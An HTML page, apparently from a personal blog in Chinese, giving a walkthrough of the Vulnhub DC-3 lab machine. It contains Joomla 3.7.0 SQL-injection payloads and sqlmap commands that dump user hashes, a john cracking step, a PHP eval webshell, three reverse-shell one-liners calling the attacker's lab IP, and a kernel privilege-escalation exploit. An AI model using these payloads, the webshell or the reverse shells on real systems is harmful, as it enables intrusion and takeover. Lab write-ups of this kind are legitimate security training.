@@ -1,0 +1,627 @@
+
+
+<!DOCTYPE html>
+<html lang="zh-CN" data-default-color-scheme=auto>
+
+
+
+<head>
+  <meta charset="UTF-8">
+  <link rel="apple-touch-icon" sizes="76x76" href="/img/icon.jpg">
+  <link rel="icon" href="/img/icon.jpg">
+  <meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=5.0, shrink-to-fit=no">
+  <meta http-equiv="x-ua-compatible" content="ie=edge">
+  
+  <meta name="theme-color" content="#2f4154">
+  <meta name="author" content="pepper">
+  <meta name="keywords" content="">
+  
+    <meta name="description" content="vulnhub靶场学习路线-全纪录">
+<meta property="og:type" content="article">
+<meta property="og:title" content="vulnhub-DC系列3">
+<meta property="og:url" content="http://example.com/2022/04/18/vulnhub-DC3/index.html">
+<meta property="og:site_name" content="Pepper&#39;s home">
+<meta property="og:description" content="vulnhub靶场学习路线-全纪录">
+<meta property="og:locale" content="zh_CN">
+<meta property="og:image" content="https://cdn.jsdelivr.net/gh/Little-pepper/images/%E5%BE%AE%E4%BF%A1%E5%9B%BE%E7%89%87_20220420141755.jpg">
+<meta property="article:published_time" content="2022-04-18T05:58:41.000Z">
+<meta property="article:modified_time" content="2022-04-20T06:25:22.029Z">
+<meta property="article:author" content="pepper">
+<meta property="article:tag" content="靶场练习">
+<meta name="twitter:card" content="summary_large_image">
+<meta name="twitter:image" content="https://cdn.jsdelivr.net/gh/Little-pepper/images/%E5%BE%AE%E4%BF%A1%E5%9B%BE%E7%89%87_20220420141755.jpg">
+  
+  
+  <title>vulnhub-DC系列3 - Pepper&#39;s home</title>
+
+  <link  rel="stylesheet" href="https://cdn.jsdelivr.net/npm/bootstrap@4/dist/css/bootstrap.min.css" />
+
+
+  <link  rel="stylesheet" href="https://cdn.jsdelivr.net/npm/github-markdown-css@4/github-markdown.min.css" />
+  <link  rel="stylesheet" href="https://cdn.jsdelivr.net/npm/hint.css@2/hint.min.css" />
+
+  
+    
+    
+      
+      <link  rel="stylesheet" href="https://cdn.jsdelivr.net/npm/highlight.js@10/styles/agate.min.css" />
+    
+  
+
+  
+    <link  rel="stylesheet" href="https://cdn.jsdelivr.net/npm/@fancyapps/fancybox@3/dist/jquery.fancybox.min.css" />
+  
+
+
+<!-- 主题依赖的图标库，不要自行修改 -->
+
+<link rel="stylesheet" href="//at.alicdn.com/t/font_1749284_ba1fz6golrf.css">
+
+
+
+<link rel="stylesheet" href="//at.alicdn.com/t/font_1736178_lbnruvf0jn.css">
+
+
+<link  rel="stylesheet" href="/css/main.css" />
+
+<!-- 自定义样式保持在最底部 -->
+
+
+  <script id="fluid-configs">
+    var Fluid = window.Fluid || {};
+    var CONFIG = {"hostname":"example.com","root":"/","version":"1.8.14","typing":{"enable":true,"typeSpeed":70,"cursorChar":"_","loop":false},"anchorjs":{"enable":true,"element":"h1,h2,h3,h4,h5,h6","placement":"right","visible":"hover","icon":""},"progressbar":{"enable":true,"height_px":3,"color":"#29d","options":{"showSpinner":false,"trickleSpeed":100}},"copy_btn":true,"image_zoom":{"enable":true,"img_url_replace":["",""]},"toc":{"enable":true,"headingSelector":"h1,h2,h3,h4,h5,h6","collapseDepth":0},"lazyload":{"enable":true,"loading_img":"/img/loading.gif","onlypost":false,"offset_factor":2},"web_analytics":{"enable":false,"baidu":null,"google":null,"gtag":null,"tencent":{"sid":null,"cid":null},"woyaola":null,"cnzz":null,"leancloud":{"app_id":null,"app_key":null,"server_url":null,"path":"window.location.pathname","ignore_local":false}},"search_path":"/local-search.xml"};
+  </script>
+  <script  src="/js/utils.js" ></script>
+  <script  src="/js/color-schema.js" ></script>
+<meta name="generator" content="Hexo 6.1.0"></head>
+
+
+<body>
+  <header style="height: 70vh;">
+    <nav id="navbar" class="navbar fixed-top  navbar-expand-lg navbar-dark scrolling-navbar">
+  <div class="container">
+    <a class="navbar-brand" href="/">
+      <strong>Pepper’s home</strong>
+    </a>
+
+    <button id="navbar-toggler-btn" class="navbar-toggler" type="button" data-toggle="collapse"
+            data-target="#navbarSupportedContent"
+            aria-controls="navbarSupportedContent" aria-expanded="false" aria-label="Toggle navigation">
+      <div class="animated-icon"><span></span><span></span><span></span></div>
+    </button>
+
+    <!-- Collapsible content -->
+    <div class="collapse navbar-collapse" id="navbarSupportedContent">
+      <ul class="navbar-nav ml-auto text-center">
+        
+          
+          
+          
+          
+            <li class="nav-item">
+              <a class="nav-link" href="/">
+                <i class="iconfont icon-home-fill"></i>
+                首页
+              </a>
+            </li>
+          
+        
+          
+          
+          
+          
+            <li class="nav-item">
+              <a class="nav-link" href="/archives/">
+                <i class="iconfont icon-archive-fill"></i>
+                文章
+              </a>
+            </li>
+          
+        
+          
+          
+          
+          
+            <li class="nav-item">
+              <a class="nav-link" href="/categories/">
+                <i class="iconfont icon-category-fill"></i>
+                分类
+              </a>
+            </li>
+          
+        
+          
+          
+          
+          
+            <li class="nav-item">
+              <a class="nav-link" href="/about/">
+                <i class="iconfont icon-user-fill"></i>
+                关于
+              </a>
+            </li>
+          
+        
+        
+          <li class="nav-item" id="search-btn">
+            <a class="nav-link" target="_self" href="javascript:;" data-toggle="modal" data-target="#modalSearch" aria-label="Search">
+              &nbsp;<i class="iconfont icon-search"></i>&nbsp;
+            </a>
+          </li>
+        
+        
+          <li class="nav-item" id="color-toggle-btn">
+            <a class="nav-link" target="_self" href="javascript:;" aria-label="Color Toggle">&nbsp;<i
+                class="iconfont icon-dark" id="color-toggle-icon"></i>&nbsp;</a>
+          </li>
+        
+      </ul>
+    </div>
+  </div>
+</nav>
+
+    <div class="banner" id="banner" parallax=true
+         style="background: url('/img/window.jpg') no-repeat center center;
+           background-size: cover;">
+      <div class="full-bg-img">
+        <div class="mask flex-center" style="background-color: rgba(0, 0, 0, 0.3)">
+          <div class="page-header text-center fade-in-up">
+            <span class="h2" id="subtitle" title="vulnhub-DC系列3">
+              
+            </span>
+
+            
+              <div class="mt-3">
+  
+  
+    <span class="post-meta">
+      <i class="iconfont icon-date-fill" aria-hidden="true"></i>
+      <time datetime="2022-04-18 13:58" pubdate>
+        2022年4月18日 下午
+      </time>
+    </span>
+  
+</div>
+
+<div class="mt-1">
+  
+    <span class="post-meta mr-2">
+      <i class="iconfont icon-chart"></i>
+      4.3k 字
+    </span>
+  
+
+  
+    <span class="post-meta mr-2">
+      <i class="iconfont icon-clock-fill"></i>
+      
+      
+      36 分钟
+    </span>
+  
+
+  
+  
+</div>
+
+            
+          </div>
+
+          
+        </div>
+      </div>
+    </div>
+  </header>
+
+  <main>
+    
+      
+
+<div class="container-fluid nopadding-x">
+  <div class="row nomargin-x">
+    <div class="d-none d-lg-block col-lg-2"></div>
+    <div class="col-lg-8 nopadding-x-md">
+      <div class="container nopadding-x-md" id="board-ctn">
+        <div class="py-5" id="board">
+          <article class="post-content mx-auto">
+            <!-- SEO header -->
+            <h1 style="display: none">vulnhub-DC系列3</h1>
+            
+            <div class="markdown-body">
+              <h3 id="1-写在前面"><a href="#1-写在前面" class="headerlink" title="1.写在前面"></a>1.写在前面</h3><blockquote>
+<p>这是DC系列的第3个，也是vulnhub靶场练习的第4篇文章。</p>
+<p>“人在保持远视的时候，有选择总是好的”</p>
+<p>Tips：DC3还是有很多值得学习和总结的，本次只有一个flag，全程没有提醒哦！</p>
+</blockquote>
+<h3 id="2-知识点速记"><a href="#2-知识点速记" class="headerlink" title="2.知识点速记"></a>2.知识点速记</h3><ul>
+<li>exploitdb 漏洞速查</li>
+<li>mysql注入及sqlmap使用</li>
+<li>john密码破解</li>
+<li>Linux提权<ul>
+<li>linux内核提权 - searchexploit</li>
+<li>linux提权自检工具 - linux-exploit-suggester-master</li>
+</ul>
+</li>
+</ul>
+<hr>
+<h3 id="3-环境配置"><a href="#3-环境配置" class="headerlink" title="3.环境配置"></a>3.环境配置</h3><p>直接去vulnhub官网下载 <a target="_blank" rel="noopener" href="https://www.vulnhub.com/entry/dc-32,312/">Vulnhub-DC3</a>对应的ova文件即可，然后拖入vmware。这里为了方便宿主机与靶机通讯，将虚拟机的网络模式设置为了<strong>NAT</strong>模式</p>
+<p>Win10 宿主机、kali2020 攻击机、vulnhub靶机 </p>
+<h3 id="4-信息收集"><a href="#4-信息收集" class="headerlink" title="4.信息收集"></a>4.信息收集</h3><p>环境配置好后，首先确认一下IP，在kali上查看当前IP为 192.168.114.128</p>
+<h4 id="4-1-常规探测"><a href="#4-1-常规探测" class="headerlink" title="4.1 常规探测"></a>4.1 常规探测</h4><p>对当前网段的主机进行扫描</p>
+<p><img src="https://cdn.jsdelivr.net/gh/Little-pepper/images/%E4%BC%81%E4%B8%9A%E5%BE%AE%E4%BF%A1%E6%88%AA%E5%9B%BE_16502532528320.png" srcset="/img/loading.gif" lazyload></p>
+<p>定位靶机IP：<code>192.168.114.133</code></p>
+<p>吸取DC2中的教训，这次针对存活IP进行详细的全端口扫描和指纹识别：</p>
+<p><img src="https://cdn.jsdelivr.net/gh/Little-pepper/images/%E4%BC%81%E4%B8%9A%E5%BE%AE%E4%BF%A1%E6%88%AA%E5%9B%BE_16502533485961.png" srcset="/img/loading.gif" lazyload></p>
+<p>尴尬的是，只有80端口开放了，搜索了下 joomla是开源的内容管理CMS。</p>
+<p>访问下看看：</p>
+<img src="https://cdn.jsdelivr.net/gh/Little-pepper/images/%E4%BC%81%E4%B8%9A%E5%BE%AE%E4%BF%A1%E6%88%AA%E5%9B%BE_16502535117398.png" srcset="/img/loading.gif" lazyload alt="" style="zoom: 67%;" />
+
+<p>按照以往的经验，这时候就得扫一波目录和文件了：</p>
+<p>用我们的老工具<code>gobuster 和 dirb</code>：</p>
+<p>并没有什么惊喜，倒是发现了默认的<strong>管理后台</strong>。</p>
+<p><img src="https://cdn.jsdelivr.net/gh/Little-pepper/images/image-20220419180457714.png" srcset="/img/loading.gif" lazyload></p>
+<img src="https://cdn.jsdelivr.net/gh/Little-pepper/images/%E4%BC%81%E4%B8%9A%E5%BE%AE%E4%BF%A1%E6%88%AA%E5%9B%BE_16502599477558.png" srcset="/img/loading.gif" lazyload style="zoom: 80%;" />
+
+<hr>
+<h4 id="4-2-CMS探测"><a href="#4-2-CMS探测" class="headerlink" title="4.2 CMS探测"></a>4.2 CMS探测</h4><blockquote>
+<p><strong>渗透思路：</strong></p>
+<p>按照以往思路，发现CMS可以用对应的自动化测试工具进行扫描</p>
+<p>比如之前的wordpress，就有wpscan工具，来识别版本、插件漏洞、目录等</p>
+</blockquote>
+<p>这里看了下，joomla的CMS确实存在自动化工具：<a target="_blank" rel="noopener" href="https://github.com/OWASP/joomscan">joomscan</a> （其实是看别人的wp）</p>
+<p>那就来扫一下：</p>
+<img src="https://cdn.jsdelivr.net/gh/Little-pepper/images/%E4%BC%81%E4%B8%9A%E5%BE%AE%E4%BF%A1%E6%88%AA%E5%9B%BE_16503638434651.png" srcset="/img/loading.gif" lazyload alt="img" style="zoom:80%;" />
+
+<p>这里发现CMS的版本：<code>3.7.0</code>，同时，也扫到了默认的后台管理地址</p>
+<p>这里真实情况是，当时用的<strong>msf的search模块</strong>，来识别的版本：</p>
+<p><img src="https://cdn.jsdelivr.net/gh/Little-pepper/images/image-20220419184117929.png" srcset="/img/loading.gif" lazyload></p>
+<p><img src="https://cdn.jsdelivr.net/gh/Little-pepper/images/%E4%BC%81%E4%B8%9A%E5%BE%AE%E4%BF%A1%E6%88%AA%E5%9B%BE_16502610233912.png" srcset="/img/loading.gif" lazyload></p>
+<hr>
+<blockquote>
+<p><strong>知识点1：exploit漏洞速查:</strong></p>
+<ul>
+<li>exploit joomla 3.7.0 ## 搜索版本exp</li>
+<li>exploit -p 42033  ## 查看exp描述</li>
+<li>&#x2F;usr&#x2F;share&#x2F;exploitdb&#x2F;exploits&#x2F; ## path基础路径</li>
+</ul>
+</blockquote>
+<p>拿到准确版本，我们就去搜一下有没有什么漏洞可利用：</p>
+<p><img src="https://cdn.jsdelivr.net/gh/Little-pepper/images/image-20220419183520523.png" srcset="/img/loading.gif" lazyload></p>
+<p>哦豁，这不是来了个SQL注入吗！来看看这个exp咋个整：</p>
+<p><img src="https://cdn.jsdelivr.net/gh/Little-pepper/images/image-20220419184453901.png" srcset="/img/loading.gif" lazyload></p>
+<hr>
+<h3 id="5-漏洞利用"><a href="#5-漏洞利用" class="headerlink" title="5.漏洞利用"></a>5.漏洞利用</h3><h4 id="5-1-SQL注入利用"><a href="#5-1-SQL注入利用" class="headerlink" title="5.1 SQL注入利用"></a>5.1 SQL注入利用</h4><blockquote>
+<p><strong>知识点2：mysql注入及sqlmap使用</strong></p>
+<p><a target="_blank" rel="noopener" href="https://www.jianshu.com/p/76451380b129">joomla 3.7 SQL Injection(CVE-2017-8917)漏洞复现</a></p>
+</blockquote>
+<p>这里建议根据上面这个文章，手工注入实现一遍。熟悉手注流程：</p>
+<p><code>查数据库：information_schema.SCHEMATA</code></p>
+<p><code>查表：information_schema.tables</code></p>
+<p><code>查列：information_schema.COLUMNS</code></p>
+<figure class="highlight plaintext"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs mysql">## 报错注入测试<br>updatexml(1,concat(0x3a,user()0x3a),0)<br>## 获取表名<br>UpdateXML(2, concat(0x3a,(SELECT(concat(TABLE_SCHEMA,0x3a,TABLE_NAME))FROM(information_schema.tables) LIMIT 0,1),0x3a),1)<br>## 获取列名<br>UpdateXML(2,concat(0x3a,(SELECT(concat(COLUMN_NAME))FROM(information_schema.COLUMNS) WHERE TABLE_NAME LIKE 0x6c6d6278635f636f6e74656e7474 LIMIT 0,1),0x3a),1)<br>## 获取内容<br>UpdateXML(2,%20concat(0x3a,(SELECT(concat(title))FROM(lmbxc_content)%20LIMIT%200,1),0x3a),1)<br></code></pre></div></td></tr></table></figure>
+
+<p>简单测试下漏洞确实存在：</p>
+<p><img src="https://cdn.jsdelivr.net/gh/Little-pepper/images/%E4%BC%81%E4%B8%9A%E5%BE%AE%E4%BF%A1%E6%88%AA%E5%9B%BE_16502614968760.png" srcset="/img/loading.gif" lazyload></p>
+<p>这里由于limit偏移的缘故，所以借助了burp的intruder模块进行自动化爆破：</p>
+<p><img src="https://cdn.jsdelivr.net/gh/Little-pepper/images/%E4%BC%81%E4%B8%9A%E5%BE%AE%E4%BF%A1%E6%88%AA%E5%9B%BE_16502634136283.png" srcset="/img/loading.gif" lazyload></p>
+<p>同时还学习了如何在intruder结果里筛选字段及信息：</p>
+<p><img src="https://cdn.jsdelivr.net/gh/Little-pepper/images/%E4%BC%81%E4%B8%9A%E5%BE%AE%E4%BF%A1%E6%88%AA%E5%9B%BE_16502634739732.png" srcset="/img/loading.gif" lazyload></p>
+<p>经过筛选后，可以看到不同的数据库表，但这里显示不全，详见上面的文章。</p>
+<p><img src="https://cdn.jsdelivr.net/gh/Little-pepper/images/%E4%BC%81%E4%B8%9A%E5%BE%AE%E4%BF%A1%E6%88%AA%E5%9B%BE_16502634875315.png" srcset="/img/loading.gif" lazyload></p>
+<p>这里仅复盘学习下手注的过程，我们还是直接上sqlmap一把梭：</p>
+<figure class="highlight sh"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs sh">$ sqlmap -u <span class="hljs-string">&#x27;http://192.168.114.133/index.php?option=com_fields&amp;view=fields&amp;layout=modal&amp;list[fullordering]=UpdateXML&#x27;</span> -p list[fullordering] --level=3 --risk=3 --tables<br></code></pre></div></td></tr></table></figure>
+
+<img src="https://cdn.jsdelivr.net/gh/Little-pepper/images/%E4%BC%81%E4%B8%9A%E5%BE%AE%E4%BF%A1%E6%88%AA%E5%9B%BE_16502670517604.png" srcset="/img/loading.gif" lazyload style="zoom:67%;" />
+
+<p>扫到<code>joomladb</code>，然后我们直接看<code>users</code>表的列：</p>
+<figure class="highlight sh"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs sh">$ sqlmap -u <span class="hljs-string">&#x27;http://192.168.114.133/index.php?option=com_fields&amp;view=fields&amp;layout=modal&amp;list[fullordering]=UpdateXML&#x27;</span> -p list[fullordering] --level=3 --risk=3 -D joomladb -T <span class="hljs-string">&#x27;#__users&#x27;</span> --columns<br></code></pre></div></td></tr></table></figure>
+
+<p><img src="https://cdn.jsdelivr.net/gh/Little-pepper/images/%E4%BC%81%E4%B8%9A%E5%BE%AE%E4%BF%A1%E6%88%AA%E5%9B%BE_16502673845101.png" srcset="/img/loading.gif" lazyload></p>
+<p>然后就是查看内容了：</p>
+<figure class="highlight sh"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs sh">$ sqlmap -u <span class="hljs-string">&#x27;http://192.168.114.133/index.php?option=com_fields&amp;view=fields&amp;layout=modal&amp;list[fullordering]=UpdateXML&#x27;</span> -p list[fullordering] --level=3 --risk=3 -D joomladb -T <span class="hljs-string">&#x27;#__users&#x27;</span> --columns -C <span class="hljs-string">&quot;username,password&quot;</span> --dump<br></code></pre></div></td></tr></table></figure>
+
+<p><img src="https://cdn.jsdelivr.net/gh/Little-pepper/images/%E4%BC%81%E4%B8%9A%E5%BE%AE%E4%BF%A1%E6%88%AA%E5%9B%BE_16502677241787.png" srcset="/img/loading.gif" lazyload></p>
+<p>这里得到的password并非明文，但应该也是某种HASH算法</p>
+<p><code>admin / $2y$10$DpfpYjADpejngxNh9GnmCeyIHCWpL97CVRnGeZsVJwR0kWFlfB1Zu</code></p>
+<hr>
+<h4 id="5-2-hash密码爆破"><a href="#5-2-hash密码爆破" class="headerlink" title="5.2 hash密码爆破"></a>5.2 hash密码爆破</h4><blockquote>
+<p><strong>知识点3： john密码爆破</strong></p>
+</blockquote>
+<p>这里按照之前DC1-Drupal的处理思路，其实有以下几种解决方案：</p>
+<ol>
+<li>重置密码：包括前端邮件确认、mysql后台覆盖</li>
+<li>服务器自带加解密脚本发现</li>
+</ol>
+<p>但这里都不具备条件，邮件就不说了，后台覆盖需要更新数据，而sqlmap执行更新语句存在权限问题</p>
+<p>这里查看了别人的wp后发现用了<code>john</code>这个工具：</p>
+<img src="https://cdn.jsdelivr.net/gh/Little-pepper/images/%E4%BC%81%E4%B8%9A%E5%BE%AE%E4%BF%A1%E6%88%AA%E5%9B%BE_16502707108334.png" srcset="/img/loading.gif" lazyload style="zoom:80%;" />
+
+<p>需要先把hash写入文件，john第一次碰撞后，后续再检测同样文件不会再次碰撞</p>
+<p>直接<code>--show</code>就可以查看密码：<code>admin/snoopy</code></p>
+<p><strong>PS：这里如果真的走投无路，也可以直接爆破后台试试了</strong></p>
+<hr>
+<h4 id="5-3-后台getshell"><a href="#5-3-后台getshell" class="headerlink" title="5.3 后台getshell"></a>5.3 后台getshell</h4><p>这里后台getshell，不同的CMS虽然各异，但基本原理还是相同的</p>
+<p>总体上有三个思路：</p>
+<ol>
+<li>主题模板的上传or修</li>
+<li>媒体文件上传</li>
+<li>模块化插件上传</li>
+</ol>
+<p><img src="https://cdn.jsdelivr.net/gh/Little-pepper/images/%E4%BC%81%E4%B8%9A%E5%BE%AE%E4%BF%A1%E6%88%AA%E5%9B%BE_16503379936376.png" srcset="/img/loading.gif" lazyload></p>
+<p>这里简单写个一句话，待会连接蚁剑，方便文件管理：</p>
+<p><img src="https://cdn.jsdelivr.net/gh/Little-pepper/images/%E4%BC%81%E4%B8%9A%E5%BE%AE%E4%BF%A1%E6%88%AA%E5%9B%BE_16503484451171.png" srcset="/img/loading.gif" lazyload></p>
+<figure class="highlight php"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs php"><span class="hljs-comment">## 一句话木马</span><br><span class="hljs-meta">&lt;?php</span><br><span class="hljs-keyword">echo</span> <span class="hljs-title function_ invoke__">md5</span>(<span class="hljs-number">1234</span>);<br>@<span class="hljs-keyword">eval</span>(<span class="hljs-variable">$_REQUEST</span>[test])<br><span class="hljs-meta">?&gt;</span><br></code></pre></div></td></tr></table></figure>
+
+<blockquote>
+<p><strong>坑点：</strong> shell文件路径</p>
+<p>这里针对所有的CMS都是一样的，上传的shell需要定位路径</p>
+<p><code>http://192.168.114.133/template/beez3/html/test.php</code></p>
+</blockquote>
+<p>OK，连个蚁剑上去，没问题。</p>
+<p>注意：提权需要tcp通道，而蚁剑是基于HTTP的瞬时协议，需要换个本地shell环境</p>
+<p><img src="https://cdn.jsdelivr.net/gh/Little-pepper/images/%E4%BC%81%E4%B8%9A%E5%BE%AE%E4%BF%A1%E6%88%AA%E5%9B%BE_16503569102193.png" srcset="/img/loading.gif" lazyload></p>
+<p>反弹shell常用命令：</p>
+<figure class="highlight sh"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs sh"><span class="hljs-built_in">rm</span> /tmp/f;<span class="hljs-built_in">mkfifo</span> /tmp/f;<span class="hljs-built_in">cat</span> /tmp/f|/bin/sh -i 2&gt;&amp;1|nc 192.168.114.128 1234&gt;/tmp/f<br>nc -e /bin/bash 192.168.114.128 1234<br>/bin/bash -i &gt;&amp; /dev/tcp/192.168.114.128/1234 0&gt;&amp;1<br></code></pre></div></td></tr></table></figure>
+
+<p>当然，搞个msf上传reverse_shell也没问题，这里就不演示了</p>
+<hr>
+<h3 id="7-提权"><a href="#7-提权" class="headerlink" title="7.提权"></a>7.提权</h3><blockquote>
+<p><strong>知识点4：Linux内核漏洞提权</strong></p>
+<p>除了之前的suid和sudo linux提权方式还有很多</p>
+<p>可参考这篇：<a target="_blank" rel="noopener" href="https://blog.csdn.net/whatday/article/details/112387137">linux 提权方法总结</a></p>
+</blockquote>
+<p>看了些文章，想到用内核提权。但由于c编译等问题，一直未果</p>
+<h4 id="7-1-主机信息获取"><a href="#7-1-主机信息获取" class="headerlink" title="7.1 主机信息获取"></a>7.1 主机信息获取</h4><p>内核漏洞提权的前提是掌握主机的发行版本、内核版本等信息</p>
+<figure class="highlight sh"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs sh"><span class="hljs-built_in">uname</span> -a<br><span class="hljs-built_in">cat</span> /etc/*-release<br><span class="hljs-built_in">cat</span> /etc/issue<br></code></pre></div></td></tr></table></figure>
+
+<p><img src="https://cdn.jsdelivr.net/gh/Little-pepper/images/%E4%BC%81%E4%B8%9A%E5%BE%AE%E4%BF%A1%E6%88%AA%E5%9B%BE_16503473136974.png" srcset="/img/loading.gif" lazyload></p>
+<ul>
+<li>内核版本：4.4.0-21-generic</li>
+<li>发行版本：Ubuntu 16.04</li>
+<li>架构：i686 (i386的子集) arm架构 -32位</li>
+</ul>
+<hr>
+<h4 id="7-2-内核漏洞检索"><a href="#7-2-内核漏洞检索" class="headerlink" title="7.2 内核漏洞检索"></a>7.2 内核漏洞检索</h4><p>这里首先列一下exploitdb的内核漏洞搜索相关命令：</p>
+<figure class="highlight sh"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs sh"><span class="hljs-comment">## 检索命令</span><br>searchexploit ubuntu 16.04 4.4<br><span class="hljs-comment">## 查看exp的使用说明</span><br>searchexploit -p 46529.c<br><span class="hljs-comment">## 查看具体文件</span><br><span class="hljs-built_in">cat</span> /usr/share/exploitdb/exploits/xxxxx<br></code></pre></div></td></tr></table></figure>
+
+<p><img src="https://cdn.jsdelivr.net/gh/Little-pepper/images/%E4%BC%81%E4%B8%9A%E5%BE%AE%E4%BF%A1%E6%88%AA%E5%9B%BE_16503584812900.png" srcset="/img/loading.gif" lazyload></p>
+<p>这里看下具体如何使用，需要下载对应的文件：</p>
+<p><img src="https://cdn.jsdelivr.net/gh/Little-pepper/images/image-20220420132335200.png" srcset="/img/loading.gif" lazyload></p>
+<p>其实最开始并不知道要使用39772这个漏洞，但后面总结了一些规律：</p>
+<ul>
+<li>发行版本、内核版本一致</li>
+<li>i686架构是arm的32位，不能选amd的x86相关exp</li>
+<li>尽量选择不需要编译的（容易出错</li>
+</ul>
+<p>通过蚁剑上传这几个提权文件</p>
+<p><img src="https://cdn.jsdelivr.net/gh/Little-pepper/images/image-20220420132530980.png" srcset="/img/loading.gif" lazyload></p>
+<p>运行下compile.sh，会自动编译<code>doubleput.c、hello.c、suidhelper.c</code></p>
+<p><img src="https://cdn.jsdelivr.net/gh/Little-pepper/images/%E4%BC%81%E4%B8%9A%E5%BE%AE%E4%BF%A1%E6%88%AA%E5%9B%BE_16503575489337.png" srcset="/img/loading.gif" lazyload></p>
+<p>然后运行下编译好的doubleput</p>
+<img src="https://cdn.jsdelivr.net/gh/Little-pepper/images/%E4%BC%81%E4%B8%9A%E5%BE%AE%E4%BF%A1%E6%88%AA%E5%9B%BE_16503576392209.png" srcset="/img/loading.gif" lazyload style="zoom:80%;" />
+
+<p>成功提权，拿到Flag，打完收工</p>
+<img src="https://cdn.jsdelivr.net/gh/Little-pepper/images/%E4%BC%81%E4%B8%9A%E5%BE%AE%E4%BF%A1%E6%88%AA%E5%9B%BE_16503556828885.png" srcset="/img/loading.gif" lazyload style="zoom:80%;" />
+
+<hr>
+<h4 id="7-3-主机提权自检工具"><a href="#7-3-主机提权自检工具" class="headerlink" title="7.3 主机提权自检工具"></a>7.3 主机提权自检工具</h4><blockquote>
+<p><strong>知识点5：使用提权自检工具自动化扫描</strong></p>
+<p><strong>挖个坑：Linux自动化提权</strong></p>
+</blockquote>
+<p>这里马后炮一下，复盘其他wp的时候发现有位老哥蚁剑上传了一个sh，来实现自动化检索漏洞</p>
+<p>看起来比较方便，后面搜了一下，可以使用这个工具来辅助检查：<a target="_blank" rel="noopener" href="https://github.com/mzet-/linux-exploit-suggester">linux-exploit-suggester</a></p>
+<p>简单测试下，也做个总结：</p>
+<p><img src="https://cdn.jsdelivr.net/gh/Little-pepper/images/%E4%BC%81%E4%B8%9A%E5%BE%AE%E4%BF%A1%E6%88%AA%E5%9B%BE_1650360276594.png" srcset="/img/loading.gif" lazyload></p>
+<p>上面的脏牛试过，直接把服务器打崩了…..不过这里也列出了double_fdput</p>
+<p><img src="https://cdn.jsdelivr.net/gh/Little-pepper/images/%E4%BC%81%E4%B8%9A%E5%BE%AE%E4%BF%A1%E6%88%AA%E5%9B%BE_16503603058410.png" srcset="/img/loading.gif" lazyload></p>
+<p>当然，linux自动化提权的方式还有很多，先挖个坑，后面补一下！</p>
+<hr>
+<h3 id="8-写在结尾"><a href="#8-写在结尾" class="headerlink" title="8.写在结尾"></a>8.写在结尾</h3><p>整个DC3还是有很多新内容学习的，比如漏洞点识别、sql注入与sqlmap使用、john爆破、内核提权等。</p>
+<p><strong>几个比较好的WP：</strong></p>
+<blockquote>
+<p><a target="_blank" rel="noopener" href="https://www.redhatzone.com/ask/article/1429.html">VulnHub通关日记-DC_3-Walkthrough</a></p>
+<p><a target="_blank" rel="noopener" href="https://bbs.pediy.com/thread-266085-1.htm#msg_header_h2_0">小蜘蛛带你一起学习DC-3</a></p>
+<p><a target="_blank" rel="noopener" href="https://blog.csdn.net/weixin_44288604/article/details/107938527">vulnhub之DC3靶机</a></p>
+</blockquote>
+<p><strong>To Do List：</strong></p>
+<ol>
+<li>学习总结下Linux下的提权方式</li>
+<li>Linux自动化提权总结</li>
+</ol>
+
+            </div>
+            <hr>
+            <div>
+              <div class="post-metas mb-3">
+                
+                  <div class="post-meta mr-3">
+                    <i class="iconfont icon-category"></i>
+                    
+                      <a class="hover-with-bg" href="/categories/%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95/">渗透测试</a>
+                    
+                      <a class="hover-with-bg" href="/categories/%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95/vulnhub%E9%9D%B6%E5%9C%BA%E7%BB%83%E4%B9%A0/">vulnhub靶场练习</a>
+                    
+                  </div>
+                
+                
+                  <div class="post-meta">
+                    <i class="iconfont icon-tags"></i>
+                    
+                      <a class="hover-with-bg" href="/tags/%E9%9D%B6%E5%9C%BA%E7%BB%83%E4%B9%A0/">靶场练习</a>
+                    
+                  </div>
+                
+              </div>
+              
+              
+                <div class="post-prevnext">
+                  <article class="post-prev col-6">
+                    
+                    
+                  </article>
+                  <article class="post-next col-6">
+                    
+                    
+                      <a href="/2022/04/14/vulhub-DC2/">
+                        <span class="hidden-mobile">vulnhub-DC系列2</span>
+                        <span class="visible-mobile">下一篇</span>
+                        <i class="iconfont icon-arrowright"></i>
+                      </a>
+                    
+                  </article>
+                </div>
+              
+            </div>
+
+            
+          </article>
+        </div>
+      </div>
+    </div>
+    
+      <div class="d-none d-lg-block col-lg-2 toc-container" id="toc-ctn">
+        <div id="toc">
+  <p class="toc-header"><i class="iconfont icon-list"></i>&nbsp;目录</p>
+  <div class="toc-body" id="toc-body"></div>
+</div>
+
+      </div>
+    
+  </div>
+</div>
+
+<!-- Custom -->
+
+
+    
+
+    
